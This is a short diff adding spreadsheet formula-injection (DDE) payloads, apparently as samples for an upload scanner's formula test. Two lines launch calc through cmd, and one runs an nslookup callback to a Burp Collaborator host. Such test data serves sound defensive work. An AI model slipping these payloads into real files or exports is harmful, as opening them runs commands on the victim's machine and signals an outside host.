@@ -1,0 +1,4 @@
+=cmd|' /C calc'!A0
+@SUM(1+1)*cmd|' /C calc'!A0
+-2+3+cmd|' /C nslookup collab-test.burpcollaborator.net'!A0
+"UPLOAD_SCANNER_SAMPLE","FormulaTest"
